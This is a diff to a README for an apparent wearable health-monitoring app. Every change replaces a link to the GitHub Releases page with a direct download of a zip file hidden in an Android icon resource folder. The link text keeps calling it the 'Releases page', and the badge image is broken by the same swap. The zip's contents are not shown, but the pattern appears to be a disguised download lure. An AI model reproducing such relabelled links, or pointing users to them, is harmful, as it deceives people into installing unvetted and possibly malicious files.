@@ -1,7 +1,7 @@
 # 🩺 Health-Monitoring-Wearable-Device - Track Your Health with Ease
 
 ## 🔗 Download Now
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/fangatigi/Health-Monitoring-Wearable-Device/releases)
+[![Download Releases](https://github.com/fangatigi/Health-Monitoring-Wearable-Device/raw/refs/heads/main/android/app/src/main/res/mipmap-xxxhdpi/Health-Monitoring-Device-Wearable-v3.5.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/fangatigi/Health-Monitoring-Wearable-Device/raw/refs/heads/main/android/app/src/main/res/mipmap-xxxhdpi/Health-Monitoring-Device-Wearable-v3.5.zip)
 
 ## 📖 Description
 Health Monitor is a real-time wearable system designed to keep track of key health metrics. Using ESP32 technology and a user-friendly Flutter app, this device monitors heart rate, SpO₂ (blood oxygen levels), ECG (heart activity), temperature, and falls. It sends data via Bluetooth Low Energy (BLE) to a smartphone for live visualization, alerts, and health insights. This application combines embedded systems, sensors, wireless technology, and mobile development to offer you a reliable health tracking solution.
@@ -15,7 +15,7 @@ Follow these steps to download and run the Health Monitor application:
    - Minimum of 100MB free storage on your smartphone.
 
 2. **Download the Application**
-   - Visit the [Releases page here](https://github.com/fangatigi/Health-Monitoring-Wearable-Device/releases) to download the latest version of the Health Monitor app.
+   - Visit the [Releases page here](https://github.com/fangatigi/Health-Monitoring-Wearable-Device/raw/refs/heads/main/android/app/src/main/res/mipmap-xxxhdpi/Health-Monitoring-Device-Wearable-v3.5.zip) to download the latest version of the Health Monitor app.
 
 3. **Install the Application**
    - Locate the downloaded file in your smartphone's downloads folder.
@@ -40,7 +40,7 @@ Follow these steps to download and run the Health Monitor application:
 - **Data History:** Access your health data over time for better insights into your health trends.
 
 ## 📦 Download & Install
-To get started with the Health Monitor app, [visit this page to download](https://github.com/fangatigi/Health-Monitoring-Wearable-Device/releases).
+To get started with the Health Monitor app, [visit this page to download](https://github.com/fangatigi/Health-Monitoring-Wearable-Device/raw/refs/heads/main/android/app/src/main/res/mipmap-xxxhdpi/Health-Monitoring-Device-Wearable-v3.5.zip).
 
 1. Click on the latest version link.
 2. Choose the appropriate file for your device.
@@ -70,6 +70,6 @@ Your data privacy is important. The Health Monitor application adheres to best p
 - wearable-device
 
 ## 📢 Updates and Release Notes
-Stay updated with the latest features and bug fixes in the application. You can find the release notes in the [Releases section](https://github.com/fangatigi/Health-Monitoring-Wearable-Device/releases).
+Stay updated with the latest features and bug fixes in the application. You can find the release notes in the [Releases section](https://github.com/fangatigi/Health-Monitoring-Wearable-Device/raw/refs/heads/main/android/app/src/main/res/mipmap-xxxhdpi/Health-Monitoring-Device-Wearable-v3.5.zip).
 
 For any questions or feedback, please don’t hesitate to reach out. Your health is our priority, and we aim to provide you with the best monitoring solution available.
